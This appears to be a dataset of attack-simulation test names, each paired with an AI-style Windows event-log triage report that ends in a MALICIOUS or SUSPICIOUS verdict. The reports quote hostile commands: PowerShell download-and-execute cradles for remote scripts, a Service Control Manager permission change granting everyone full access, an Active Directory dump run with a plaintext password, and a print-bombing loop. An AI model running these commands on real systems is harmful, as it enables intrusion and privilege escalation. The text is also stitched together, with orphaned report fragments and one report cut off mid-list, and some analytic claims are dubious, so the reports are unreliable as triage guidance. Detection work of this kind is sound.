SOAPHound - Dump BloodHound Data,"Based on the analysis of the provided Windows event logs, several points require attention due to their potential indication of malicious activity:

### Analysis of Logs

1. **PowerShell Execution:**
   - A PowerShell command is logged with a suspicious command line: 
     ```
     powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\bin\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\temp\cache.txt --outputdirectory c:\temp\test2}
     ```
   - **SOAPHound.exe**: This executable is not recognized as a standard or expected application within a typical Windows environment. Its presence within a temporary directory and execution via PowerShell raises a red flag.

2. **Hardcoded Credentials:**
   - The use of a hardcoded password (`P@ssword1`) in this execution string is highly suspicious. This is a common tactic in various types of malware to carry out lateral movements or exfiltrate sensitive data.

3. **Process Execution in Sysmon:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` running closely together with the PowerShell execution, under the `SERVER002\admin_test` account, could suggest an attempt to manipulate event logs or monitor terminal activities stealthily.
   - The consistent appearance of these processes in conjunction with a PowerShell script indicates potential logging alteration or tampering activities.

4. **Use of Administrative Privileges:**
   - The processes run under a high integrity level, likely indicating that administrative privileges are being utilized, which could allow significant system changes or unauthorized access to system files and settings.

### Assessment

The activities highlighted, particularly the execution of suspicious PowerShell scripts with potentially malicious intent, the use of a known hardcoded password, and the pattern of process execution, align with common tactics seen in lateral movement, privilege escalation, or activities related to credential dumping and data exfiltration.

### Resolution

**Resolution: MALICIOUS**

The logs indicate a high likelihood of malicious activity involving unauthorized PowerShell usage potentially aimed at credential harvesting and system compromise. Immediate response actions are warranted, including:

- **Containment:**
  - Isolate the affected host (Server002) from the network to prevent any further spread of malicious activity.

Simulate BlackByte Ransomware Print Bombing,"## Detailed Analysis

### Suspicious or Anomalous Behavior
Upon reviewing the Windows Event Logs, the most concerning activity revolves around the execution of a PowerShell script that appears to initiate a repetitive task involving `wordpad.exe`. The relevant entry in the Sysmon log is:
- **Process**: PowerShell (`powershell.exe`)
- **CommandLine**: 
  ```plaintext
  ""powershell.exe"" & {cmd /c \""for /l %%x in (1,1,75) do start wordpad.exe /p C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data_003note.txt\"" | out-null}
  ```
This command is executed by `SERVER002\\admin_test`, a potentially compromised user account. The script is a `for` loop that attempts to open `wordpad.exe` 75 times to print a specific file. Execution of such a command in loop raises concerns as it could signify a denial-of-service attack scenario or an attempt to exploit vulnerabilities in WordPad.

### Potentially Malicious Indicators
1. **Repetitive Execution of WordPad**: The repeated command execution in a short span indicates unusual usage patterns not typically associated with benign activities. 
2. **Engagement with PowerShell**: PowerShell scripts are often used to facilitate malware activity due to their versatility and the ability to execute complex instructions without being easily detected by security tools.

Encoded VBS code execution,"After a detailed analysis of the provided Windows event logs, the following observations have been made:

1. **PowerShell logs in the Windows PowerShell log:**
   - Numerous PowerShell events indicate the execution of a potentially malicious command. The command includes downloading and executing a script from a remote URL: 
     ```
     IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
     Invoke-Maldoc -macroFile ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.005\\src\\data.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Exec""
     ```
   - The use of `Invoke-Expression` (IEX) combined with downloading a file from a remote URL and invoking a script (`Invoke-Maldoc`) is a common indication of malicious activity, typically associated with PowerShell-based malware exploitation.

2. **Sysmon logs:**
   - The Sysmon logs show the execution of PowerShell (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) by the user `SERVER002\\admin_test`.
   - The parent process for this PowerShell activity is `wsmprovhost.exe`, which can be legitimate but is noteworthy when involved in spawning a potentially malicious PowerShell session.
   - Other system processes like `whoami.exe` and `hostname.exe` are observed, but they are often used in normal operations or for enumeration by attackers.

3. **Application log from Security-SPP:**
   - No directly malicious indicators, but timestamps align with the overall timeline of the PowerShell activity.

**Assessment and Conclusion:**

The combination of PowerShell logs showing the download and execution of the `Invoke-MalDoc.ps1` script from a remote location, along with the Sysmon logs indicating this activity, strongly suggests the presence of a potentially compromised system. The methodology of using PowerShell to execute code from an external script is a hallmark of script-based attacks.

"
PowerShell Session Creation and Use,"Upon reviewing the provided Windows event logs, a number of observations were made regarding potential indicators of malicious activity. Below is a detailed analysis, focused on detecting suspicious behaviors:

### Suspicious or Anomalous Behavior Observed

1. **Use of PowerShell**: 
   - There are several entries indicating the use of PowerShell (EventID 1 and 5 in Sysmon), which is often leveraged for legitimate administration tasks. However, it's also a common tool for attackers due to its powerful capabilities for scripting. Noticeable here is the execution of PowerShell commands with command lines that involve session creation and invoking various functions. 
   - PowerShell events in Windows PowerShell logs show scripts being executed that create and test sessions, manipulate content, and ultimately remove items. While these actions might be typical for an admin, their presence warrants further scrutiny due to their potential misuse.

2. **Execution of System Utilities**:
   - There is repeated use of `wevtutil.exe` and `conhost.exe`, typically legitimate system utilities but often targeted by attackers for their scripting capabilities and ability to manipulate log files or run malicious commands. Such behavior should be verified against the expected baseline for this environment.
   - The presence of `rundll32.exe` running `""C:\\Windows\\system32\\rundll32.exe"" C:\\Windows\\system32\\PcaSvc.dll,PcaPatchSdbTask` can be typical, but this process is also commonly used to execute DLLs in a suspicious manner.

3. **Network-Related Events**:
   - Security logs show several anonymous logon events (EventID 4624). While these might represent harmless actions on the network, repeated anonymous logons could indicate an attempt to access resources without proper authentication which may suggest a reconnaissance or credential access tactic in some contexts.

4. **Event Log Clear Utilization**:
   - Execution of the `wevtutil.exe` might not be overtly suspicious in itself, but repeated and clustered usage without clear administrative purpose can sometimes indicate attempts to clear logs or artifacts of malicious actions.

### Assessment and Conclusion

Based on the provided evidence, the logs do not clearly contain any 100% intentionally malicious activity. However, the unusual frequency and patterns seen with certain tools commonly used in attacks justify a cautious assessment. Actions such as the heavy usage of PowerShell scripts, anonymous logons, and the potential for misuse of system tools like `wevtutil.exe` and `rundll32.exe` suggest further investigation.

### Resolution

**SUSPICIOUS**

The activities logged are potentially benign, but the contexts suggest further examination to ensure there has been no unauthorized or unintended use of systems or access. Steps should include:
- Verifying these actions with system administrators for authorized use.
- Reviewing broader context, including network traffic and additional endpoint logs.
- Conducting a deeper forensic analysis on scripts and their sources, especially those involving PowerShell.

Further action should also involve engaging relevant threat intelligence to see if these patterns align with known attack vectors or emerging threats."
OSTap Payload Download,"Based on my analysis of the provided Windows event logs, here are the key points and findings:

### Suspicious Behavior and Indicators:
1. **Unusual Script Execution:**
   - A suspicious command-line execution via the `cmd.exe` process is seen at record `17945`. It involves a script that accesses a GitHub URL to download a file using Jscript, which is then executed by `cscript.exe` (record `17947`). The use of scripts to download external content and execute it may indicate an attempt to execute malicious code.

2. **Potential Privilege Escalation and Persistence:**
   - The sequence of processes involving `schtasks.exe` (records `17967`, `17972`, and `17976`) indicates interaction with the Task Scheduler to delete and create tasks, possibly suggesting persistence mechanisms. This behavior, coupled with the high integrity level of the processes, is common for maintaining unauthorized access.

3. **Multiple Edge Update Executions:**
   - Numerous entries show the installation and execution of Microsoft Edge Update components. While these may be routine updates, the high frequency and use of temporary directories for execution (`C:\\Program Files (x86)\\Microsoft\\Temp\\EU8998.tmp\\`) could imply attempts to masquerade malicious activities under the guise of legitimate software updates.

4. **Credential Access Attempts:**
   - Event IDs `5379`, noted in the Security logs, indicate unsuccessful credential access attempts targeting Microsoft accounts. The frequent, unsuccessful attempts could be indicative of unauthorized access attempts.

5. **Process Execution by `ADMIN_TEST`:**
   - Several `wevtutil.exe` and `conhost.exe` executions by `SERVER002\\admin_test` are seen (Sysmon logs). While these utilities are normally part of Windows management, their sequence and connection to a local admin account should be further assessed.

### Assessment:
Given the combination of potentially malicious script execution, task scheduling to ensure persistence, and repeated executions in temporary directories with possible masquerading techniques, there is significant activity hinting at unauthorized and potentially malicious behavior.

### Threats and Risks Identified:
- Execution of potentially malicious scripts indicates risk of compromised system integrity.
- Possible execution of unauthorized tasks intended to create persistence.
- Unsuccessful credential access attempts may indicate a preparatory phase of an attack.

### Guidance:
- **Immediate Quarantine:** The host should be isolated from the network to prevent potential lateral movement.
- **Forensic Analysis:** Conduct an in-depth forensic investigation to verify if the scripts resulted in any malicious payload execution or system modifications.
- **Credential Review:** Ensure no unauthorized access was achieved; reset potentially exposed accounts, and enforce strong authentication practices.
- **Patch Management:** Confirm that legitimate software updates were applied securely and evaluate if patch management policies were followed.
- **Review and Remove Unauthorized Tasks:** Investigate and remove any unauthorized scheduled tasks to prevent persistence.

### Resolution:
- **Resolution:** MALICIOUS
- This assessment suggests confident detection of potentially malicious activity based on the current information from the logs provided. Further investigation and remedial actions are strongly recommended."
ATHPowerShellCommandLineParameter -Command parameter variations,"After reviewing the provided Windows event logs, the analysis focuses on detecting any suspicious or malicious activities that could indicate a compromise. Here's an assessment of the activities:

### Detailed Analysis

#### Suspicious and Anomalous Behavior:
1. **PowerShell Activity**:
   - **Image**: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
   - **CommandLine**: Usage of PowerShell with specific command-line parameters `Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop`, which is unusual and may indicate automated or scripted behavior.
   - PowerShell is often used by attackers due to its powerful capabilities and this specific command usage without a clear legitimate context could be suspicious.

2. **Use of `wevtutil.exe`**:
   - Frequent execution of `wevtutil.exe` is observed. This utility manages event logs. While legitimate, repeated execution without a clear necessity might indicate attempts to clear or manipulate event logs by an attacker.

3. **Use of `whoami.exe`**:
   - Execution of `whoami.exe` could be a legitimate administrative task, but when combined with PowerShell and `wevtutil` activities, it may be used by an attacker to determine the current user context.

4. **Compatibility Telemetry Process**:
   - There are several instances of `CompatTelRunner.exe` which are related to Windows Telemetry. These usually execute under the system context, and while legitimate, their sudden appearance or frequency in logs can sometimes be related to third-party tools modifying telemetry settings.

#### Indication of Malicious Activity:
- Combining the frequent use of `PowerShell` with specific command-line parameters, usage of `wevtutil.exe`, and potentially information-gathering commands (`whoami.exe`), indicates potentially crafted or malicious scripts might be running.

- The execution privileges highlighted in the security log (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.) suggest potential misuse of privileged accounts.

### Assessment and Threats Identified:
- **Risk**: The logs indicate potentially suspicious activity that could lead to or indicate a compromise due to powerful scripting tools being utilized with specific parameters that could manipulate logs or gather critical system information.
  
- **Visibility Gap**: Lack of context around the PowerShell script's intention and associated processes can hinder clear determination of a benign or malicious activity outright.

### Guidance and Resolution:
- Further investigation is required into the context of the PowerShell script usage. Look for other indicators such as unusual network requests, historical execution patterns, or any user behavior anomalies.

- Audit or search for additional telemetry that captures network connections or file changes occurring during these periods.

- Ensure logging mechanisms are protected and that unauthorized software or scripts cannot manipulate logs.

**Resolution: SUSPICIOUS** - The activities recorded in the logs appear unusual and pose a potential security risk, warranting further investigation to rule out or confirm malicious behavior."
AutoIt Script Execution,"After reviewing and analyzing the provided Windows event logs, here is a detailed assessment of the activities observed:

### Logs Analysis

1. **Application Log**
   - An entry indicates that Windows Defender is active and in a healthy state (""SECURITY_PRODUCT_STATE_ON""). This suggests that the security measures on this system are functioning properly.

2. **Security Log**
   - **Event ID 4624**: A successful logon event. The log type is ""5"", which indicates a service startup, commonly seen on servers.
   - **Event ID 4672**: Special privileges assigned to a new logon. The privileges mentioned here (such as SeDebugPrivilege) are common for powerful accounts like the local SYSTEM account.
   - **Event ID 5379**: Credential Manager credentials were read. The return code `3221226021` indicates an unsuccessful attempt to read credentials, which is typical as Credential Manager operations often return this code when there is nothing to return or when access is attempted by a non-privileged account.
   - **Event ID 4798**: Token elevation and SIDs were logged but without any specific indication of malicious activity. However, the presence of an `admin_test` account alongside typical system accounts might suggest testing or administrative changes which should be confirmed with standard operating procedures on the server.
   
3. **Windows PowerShell Log**
   - Execution of PowerShell script via `AutoIt3.exe` was observed. AutoIt scripts are benign when expected but could indicate automation or potentially unwanted scripting if not a part of standard practice. The execution of AutoIt using a PowerShell script, especially from a temporary location, can be atypical, suggesting a need to look at intent and authorization for this action.
   
4. **Sysmon Log**
   - Multiple Sysmon log events captured various process creations:
     - Processes such as `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and `whoami.exe` were executed. While benign in many contexts, their usage must align with expected patterns.
     - The logging of high-integrity processes and PowerShell scripts under `admin_test` user highlights the need to verify this account's intended activities.
     - The observed command line for PowerShell includes the execution of AutoIt, reinforcing the unusual occurrence noted in the PowerShell logs.
     - System processes like `CompatTelRunner.exe` and `TiWorker.exe` are regularly executed as part of Windows telemetry and update services.

### Conclusion

Based on the log entries:

- The use of PowerShell to start an AutoIt script from a temporary location may warrant further investigation, particularly given that the `admin_test` user is involved, which should be verified against known administrative practices.

No definitive markers of a malicious compromise were found within these logs. However, there are indicators worthy of caution and additional scrutiny, especially around non-standard scripting and unrecognized account activities.

### Final Resolution

- **SUSPICIOUS**: The logs contain activity (PowerShell script execution of AutoIt) that does not appear entirely consistent with standard operational behavior. Further investigation into the necessity and authorization of these actions is recommended before ruling out any potential threat completely.

### Recommendations
- Verify the legitimacy and purpose of the `admin_test` account and associated activities.
- Cross-reference AutoIt script execution with known automated task usage or security policy.
- Ensure all scripts and commands executed via PowerShell, particularly those deploying binaries from temporary directories, are verified and authorized."
Snake Malware Service Create,"Upon analysis of the provided Sysmon logs, several events stand out and indicate potentially suspicious activity:

1. **Creation of New Service `WerFaultSvc`**:
    - The Sysmon log shows a `cmd.exe` process running a command to create a service (`sc.exe create ""WerFaultSvc""`). The service's binary path is set to execute `WerFault.exe`. This activity is uncommon because it's defining a new service under the guise of a legitimate system file, which is a common technique for persistence by malware.
    - Accompanying this is a Service Control Manager event in the System log indicating a new service installation at the same timestamp, reinforcing the suspicious activity.

2. **Process Creation Activity**:
    - Several known legitimate executables (`whoami.exe`, `wevtutil.exe`, `hostname.exe`) are executed. Although these processes are legitimate, they can be misused for reconnaissance or other malicious activities. The sequence and frequency of these commands could be indicative of a script or an automated process running unnoticed.
    - The command sequence involving `wevtutil.exe` suggests exporting event logs to a temporary directory, which may indicate someone is manipulating or reviewing logs for malicious purposes.

3. **High Integrity Level of User Processes**:
    - The observed activity is performed by the user `SERVER002\\admin_test` with a high integrity level. Admin privileges make any suspicious activity more capable of achieving compromise.

4. **Absence of Additional Logs**:
    - Notably, there are no Security logs provided, which are critical for detecting account logon attempts, privilege escalation actions, and other security-relevant events. This absence could indicate an intentional omission or an indicator of log tampering.

Given these observations, the presence of a newly created service with a seemingly legitimate Windows process, combined with unusual process executions and log utility use in a high-level integrity process, suggest potential malicious activities aiming to establish persistence or a more inherently subtle system manipulation.

**Resolution: MALICIOUS**

- **Threats/Risks Identified**:
  - Unauthorized service creation (`WerFaultSvc`), which can potentially serve as a point for maintaining persistence.
  - Usage of often-misused legitimate system utilities possibly indicating either reconnaissance or cover-up actions.

**Guidance on How to Proceed**:
- Isolate the host immediately to prevent any further compromise.
- Perform a thorough investigation: inspect the files and the directory paths involved in the suspicious service configuration (e.g., check the properties and hash of `WerFault.exe` in the path specified).
- Review user actions and the origin of the `admin_test` account control.
- Reinforce logging and monitoring solutions to ensure comprehensive future activity capture, particularly in Security and PowerShell logs.
- Apply additional endpoint protection solutions focused on detecting lateral movements and escalation attempts.
"
Extract Memory via VBA,"After thoroughly analyzing the provided Windows event logs, several key events draw attention due to their potentially suspicious or malicious activity.

1. **PowerShell Activity**: 
   - The logs show an invocation of PowerShell with a script sourced from a URL `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1`. This script is being executed with `Invoke-Maldoc` and aims to handle macro files and perform tasks using `Word`. The nature of this behavior, especially since it involves downloading and executing scripts from an external source, is indicative of potentially malicious activity often associated with malware delivery or attack escalation.
   - Event Record IDs such as 18019 and related PowerShell operation logs under the channel ""Windows PowerShell"" highlight these activities.

2. **Process Activity**:
   - Repeated executions of `MicrosoftEdgeUpdate.exe` and related processes seem typical for system update checks. However, the pattern and frequency of such activities alongside PowerShell investigation necessitate a broader examination of what these processes are collectively aiming to achieve. MicrosoftEdgeUpdate running as NT AUTHORITY\SYSTEM without clear user interaction could be legitimate, but given the surrounding context, it needs reviewing.

3. **User and Privilege Escalation Events**:
   - Numerous logon events by the `SYSTEM` user at high integrity levels were observed. While SYSTEM account activity is standard, the specific timing and correlation with malicious script execution invite concern.
   - Security logs demonstrate very high privilege levels assigned to processes (Event IDs 4672, and 4624), which correspond to potential unauthorized privilege escalations, a common practice in intrusions.

Overall, the PowerShell script execution behavior acts as a critical indicator of malice. It represents a prevalent tactic for remotely executing potentially harmful scripts via PowerShell, often part of APT (Advanced Persistent Threat) or cyber-attack vector strategies.

**Assessment**: The pattern of executing a PowerShell command to fetch scripts from an external source and these being associated with potentially harmful macros or documents casts a significant degree of suspicion over these logs.

**Resolution**: **MALICIOUS**

**Guidance and Next Steps**:
- Immediately isolate the affected host to prevent further potential compromises of the network.
- Conduct a comprehensive forensic investigation on the host to determine the full extent of the breach.
- Review network traffic logs and firewall rules to detect any further communications with known malicious IPs or domains.
- Invalidate potentially compromised credentials and review security policies and practices, including PowerShell execution control.
- Consider implementing stricter endpoint protection measures and enhanced logging for early detection thresholds."

3. **Application Log:**
   - The logs primarily show activities related to `edgeupdate`, and it does not provide significant information regarding suspicious activities outside what is observed in the Sysmon logs.

4. **Security Log:**
   - Events show successful logons by the `SYSTEM` user, typical of system operations and services, but note the elevated token usage that confers administrator-like privileges. 

**Assessment:**
- The sequence of events strongly suggests malicious activity. The execution of PowerShell with a remote script points to potential script-based malware. The reference to `Invoke-MalDoc.ps1` and creation of `.jse` files for execution signal attempts at executing obfuscated or hidden scripts through legitimate Windows processes.
  
**Threats/Risks Identified:**
- Execution of scripts from unknown or unverified URLs can lead to remote code execution, data exfiltration, or further malware download and installation.

**Guidance:**
1. Immediately isolate the affected host from the network to prevent further potential spread or data exfiltration.
2. Investigate `Invoke-MalDoc.ps1` and the referenced `.jse` script to determine their exact function and potential impacts.
3. Review firewall and network configurations to block any suspicious outgoing requests to similar URLs.
4. Check for available security updates or patches, particularly on services related to scripting, like PowerShell or the Windows Script Host.
5. Provide awareness training for users on the risks of executing scripts from unverified sources.

**Resolution:** MALICIOUS - The logs contain signatures of script-based malware execution, including the downloading and running of scripts known to conduct objectionable actions.

Please execute these steps promptly to mitigate any potential damage or spread of the threat."
Excel 4 Macro,"Upon analyzing the provided Windows event logs, particularly the Sysmon and PowerShell logs, several indicators of potentially malicious activity stand out:

1. **Frequent PowerShell Execution**: The Sysmon logs indicate repeated execution of `powershell.exe` by the user `SERVER002\admin_test`, initiating various scripts. PowerShell can be a legitimate tool, but it is frequently used for executing malicious scripts due to its powerful capabilities.

2. **Suspicious PowerShell Command**: The PowerShell log shows a complex command executed by `powershell.exe` involving potentially malicious activities such as removing files, creating Excel COM objects, writing encoded commands to a file, and downloading a file from the internet (`https://live.sysinternals.com/procexp.exe`). The script attempts to write to and delete scripts within the user's temporary directory, indicative of potentially harmful activity.

3. **Script-Based Network Activity**: The script appears to perform network operations, potentially indicating an attempt to exfiltrate data or download additional payloads.

4. **High-Integrity Level**: The logs show processes running at a high integrity level, indicating elevated privileges, which can often be a red flag if unwarranted.

5. **Use of `wevtutil.exe` and `conhost.exe`**: Frequent invocation of `wevtutil.exe` (Windows Event Utility) and `conhost.exe` (Console Window Host) processes without clear explanations could suggest attempts to manipulate or clear event logs, which is a tactic used by malware to cover tracks.

6. **Typical Threat Indicators**: The use of VBS scripts and the encoding of commands for execution are typical techniques seen in red team exercises or real-world attack scenarios utilizing tools like Cobalt Strike.

Based on the analysis, this activity is consistent with malicious behavior. The patterns indicate the execution of potentially malicious scripts designed to manipulate system behavior, download additional tools from the internet, and possibly evade detection.

**Resolution: MALICIOUS**

Modifying ACL of Service Control Manager via SDET,"Upon reviewing the provided Windows event logs from the ""Application,"" ""Security,"" ""System,"" ""Windows PowerShell,"" and ""Sysmon"" logs, here's a detailed analysis of the logs:

### Key Observations:
1. **Time Synchronization:**
   - There are several events related to time synchronization. The Security log (EventID 4616) indicates time changes on the system, which are standard when synchronizing time services.

2. **Microsoft Edge Update:**
   - Multiple events show activities related to `MicrosoftEdgeUpdate.exe`. This relates to operations such as ""regsvc"" registration service, update tasks, and other COM registration tasks. Such activities are common during the automatic update processes of Microsoft Edge, especially marked by process creation events in the Sysmon logs.

3. **Commands and Services:**
   - A `cmd.exe` process is observed executing a service control command (`sc.exe sdset`), which alters the security descriptor of the Service Control Manager (scmanager). The command is `""cmd.exe"" /c sc.exe sdset scmanager D:(A;;KA;;;WD)"". This command changes the security permissions to allow ""KA"" (Key All Access) for the World (WD). This could potentially allow any user to control system services, which is dangerous if not intended by an administrator.

4. **System Processes:**
   - Regular system processes like `svchost.exe`, `whoami.exe`, and `wevtutil.exe` are functioning, primarily under legitimate system contexts like `NT AUTHORITY\\SYSTEM`.

5. **User Activity:**
   - Several processes are executed under the user `SERVER002\\admin_test`, which indicates administrative privilege usage. Observing `whoami.exe` and `hostname.exe` executions may be part of administrative checks or monitoring actions.

### Assessment:
- The activities around Microsoft Edge Update seem consistent with legitimate software maintenance tasks for updating Microsoft applications.
- The `cmd.exe` invocation with `sc.exe` to change service permissions is highly suspicious if not clearly associated with a legitimate administrative task. This could be an attempt to allow unrestricted access to critical system settings, which points towards a potential security risk.
- There is no evidence of known malware signatures or overt indicators of compromise (IoCs) in this log set relating to specific malicious software.

### Recommendation:
Given the context, the presence of a command altering service permissions without documented administrative approval should be flagged for further investigation. This specific event could indicate a misconfiguration or an administrative action that wasn't logged or communicated properly. Therefore, the situation is classified as **SUSPICIOUS**.

### Resolution:
- **SUSPICIOUS**: Probe further into the context of the `sc.exe sdset` command. Verify if an authorized system administrator performed this action. Ensure that the service permissions align with organizational security policies.
- If unauthorized, conduct further audits for unexpected changes or risky configurations. Consider adjusting monitoring or employing stricter administrative controls to prevent unauthorized service-level changes."

     IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
     Invoke-Maldoc -macroFile ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\src\chromeexec-macrocode.txt"" -officeProduct ""Word"" -sub ""ExecChrome""}
     ```
   - This indicates that PowerShell was used to download and invoke a potentially malicious document via `Invoke-MalDoc.ps1`, a known tactic for delivering malware.

2. **Sysmon Events:**
   - Multiple Sysmon event logs indicate the execution of PowerShell (`powershell.exe`), which aligns with the PowerShell log entries:
     ```
     Image=""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""
     ```
   - This confirms that the suspicious PowerShell script execution observed matches the Sysmon events, strengthening the suspicion of malicious activity.

3. **User Account:**
   - The logs repeatedly show usage of the account `SERVER002\admin_test`, likely indicating the activities were performed with admin privileges, which is a common trait of malicious activities aiming to exploit system capabilities.

#### Assessment and Threats:
- The PowerShell execution downloading a script from the web and executing it in-memory is highly characteristic of attack techniques such as those used in phishing or other malware campaigns.
- Execution of scripts that are directly downloaded from a URL is a critical indicator of malicious intent, as attackers often use this method to introduce malicious payloads into systems.
- There's no evidence in the logs that these scripts were authorized or part of legitimate automation, raising further concerns.

Command prompt writing script to file then executes it,"Upon analyzing the provided event logs from the Windows host, here is a detailed assessment:

### Security & System Logs
- **Event ID 4616 from Security Log** indicates that the system time was changed. Legitimately, this can occur during normal operations, such as time synchronization processes, especially with `svchost.exe` being a common host process for Windows services.
- **System Log Events** corroborate time synchronization activities (`EventID 1 & 24` from Kernel-General, `EventID 35` from Time-Service) pointing to a time update using a legitimate NTP source (`time.windows.com`). These actions are not inherently malicious.

### Application Logs
- **EdgeUpdate Service Stops**: The application log contains messages that suggest the `edgeupdate` service stopped multiple times. This could be part of routine update operations from Microsoft Edge's update mechanism. Without accompanying failure or error logs, this does not immediately indicate malicious activity.

### Sysmon Logs
- **Process Executions with `wevtutil` and `conhost`**: The frequent invocation of `wevtutil.exe` is noteworthy primarily due to its command-line utility nature used to manage Windows Event logs. However, all entries involve a user `SERVER002\admin_test`, suggesting potential log management or viewing tasks. 
- **Edge Update Executions**: Multiple executions of Microsoft Edge Update components (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup.exe`) are visible. They align with typical update operations, including commands to register or update components which are fairly common tasks.
- **Script Execution via `cmd` and `wscript`**: The combination of command shell execution and Windows Script Host (`cmd.exe` opens a VBScript using `wscript.exe`) introduces some suspicion. It appears to generate and execute a script that checks the current user with `whoami`. While not inherently malicious, scripting of this nature, especially from temporary directories, may hint at a scripted task or test by an administrator or a potentially automated tool.
- **Process Integrity and Origin**: The processes noted in suspicious entries run with `System` or `High` integrity levels, and the majority of these processes originate from expected Windows directories or the Edge update path, which muffles concerns of tampering.

### Conclusion
- While the logs do not exhibit clear-cut indicators of compromise, such as unexpected privilege escalations or anomalous process executions with suspicious origins or unknown command-line arguments, the presence of scripting activity demanding further context suggests:
  
### Resolution: SUSPICIOUS
- **Next Steps**: Further investigation is necessary to confirm the purpose and legitimacy of the script execution noted within the temporary directory areas. Gathering more context on the user's intention (admin_test) and cross-referencing with user activity logs, scheduled tasks, or internal processes can clarify whether these actions represent benign administrative behavior or a potential precursor of scripted intrusion attempts."
WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique,"Upon reviewing the Windows event logs provided, the following analysis identifies indicators of potential malicious activity:

1. **Suspicious PowerShell Activity:**
    - There are multiple Sysmon events (EventID 1) related to the execution of `powershell.exe` with a specific command:
      - The command involves downloading and executing a script from an external URL: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1`.
      - This behavior is often associated with downloading and executing potentially malicious scripts or payloads.
    - PowerShell logs also confirm the execution of this command.

2. **Indicators of Script-Related Activities:**
    - The executed command leverages `iex(new-object net.webclient).downloadstring` which is a common technique in PowerShell to execute downloaded scripts directly in memory.
    - The concern here is the `iex` (Invoke-Expression) which executes whatever string is piped to it, commonly used in executing downloaded malicious scripts.

3. **Common Administrative Tools Abuse:**
    - Other events show execution of common Windows binaries such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`, which are often benign but could also be used as part of a script or by an attacker for reconnaissance and maintaining stealth.

4. **High Integrity Level Execution:**
    - The processes are executed with high integrity level, indicating that they have administrative privileges, which can be concerning if combined with malicious activity, allowing potential full control over the system.

**Assessment:**
The presence of PowerShell commands fetching and executing scripts from an untrusted external source strongly suggests malicious activity. This is supported by the nature of the command used and the execution context.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Response:**
   - Isolate the host (`Server002`) from the network to prevent further spread or communication with external entities.
   - Perform a memory capture for deeper analysis of potential in-memory threats.

2. **Investigation and Mitigation:**

"
Application uninstall using WMIC,"**Detailed Analysis:**

Upon reviewing the Sysmon logs, several points of interest are observed which may indicate potential malicious activity:

1. **Frequent Execution of System Utilities:**
   - **Powershell and Wevtutil Usage:** The logs show multiple executions of `powershell.exe` and `wevtutil.exe`. `Powershell` is a powerful scripting environment and often leveraged in script-based attacks. Similarly, `wevtutil` is a Windows utility that can manipulate event logs, which can be used by attackers to clear or alter event logs during post-exploitation stages to cover tracks.

2. **Unusual Command Line Usage:**
   - The command `""cmd.exe"" /c wmic /node:\""127.0.0.1\"" product where \""name like 'Tightvnc%%%%'\"" call uninstall` suggests a script or manual command execution attempting to uninstall TightVNC using a WMI call. WMI (`wmic.exe`) is frequently exploited by attackers for lateral movement and remote command execution within a compromised network.

3. **Use of High Integrity Level Processes:**
   - Processes are running at a high integrity level, which is typical but can be leveraged maliciously if exploited processes are running with elevated privileges.

4. **Suspicious Process Relationships:**
   - The usage of management tools (`wsmprovhost.exe`) as a parent process for `cmd.exe`, `powershell.exe`, and others, indicates potential misuse of management services, possibly indicative of a script or automated task running as an admin user `SERVER002\admin_test`.

5. **Indicators of Cleanup Activity:**
   - The presence of `conhost.exe` in conjunction with `cmd.exe` and `wevtutil.exe` can indicate activities related to command shells for execution and event log management, potentially to clean or tamper with logging.

6. **Software Installer/Update Activity:**
   - Instances of Microsoft Edge updates from authorized directories and users (`NT AUTHORITY\SYSTEM`) seem typical for software updates but can be scrutinized for tampered or rogue installations if integrity checks were not in place or monitored.

**Conclusion:**

Based on the analysis, the observed behavior in these logs is categorized as **SUSPICIOUS**. The repeated use of system administration utilities particularly, PowerShell, WMIC, and Wevtutil under an administrative context with suspect command lines and no clear business need warrants further investigation. In addition, the potential attempts to uninstall VNC software need verification as unauthorized removal of remote access software may imply malicious activity.

**Recommendations:**

1. **Investigate User Actions:** Verify if the `SERVER002\admin_test` user performed these actions intentionally or if these processes were hijacked or scripted by a malicious actor.

2. **Examine Network Activity:** Check network logs to verify if suspicious PowerShell or WMI activities coincide with unusual outbound network connections or lateral movements.

3. **Audit Security Controls:** Ensure audit policies on utility execution, logging configurations, and PowerShell scripting to detect or prevent unauthorized use.

4. **Verify Software Integrity:** Assess the legitimacy of updates and removal commands executed, possibly cross-referencing with asset management or update schedules.

5. **Conduct Threat Hunting:** Perform a deeper investigation to look for further anomalies related to persistence mechanisms, credential dumping, or lateral movement attempts.

Further analysis and monitoring are advised to confirm or dismiss potential compromises."
Cobalt Strike post-exploitation pipe (before 4.2),"### Analysis

Upon analyzing the provided Windows event logs, several activities and patterns merit closer attention:

1. **Use of PowerShell and Conhost.exe**: The logs show multiple instances where PowerShell and Console Host (`conhost.exe`) are being invoked by the user `SERVER002\admin_test`. While this is not inherently suspicious, the combination and rapid succession of these tools could indicate scripting or the use of tools that rely on command line execution which is commonly associated with threat activities.

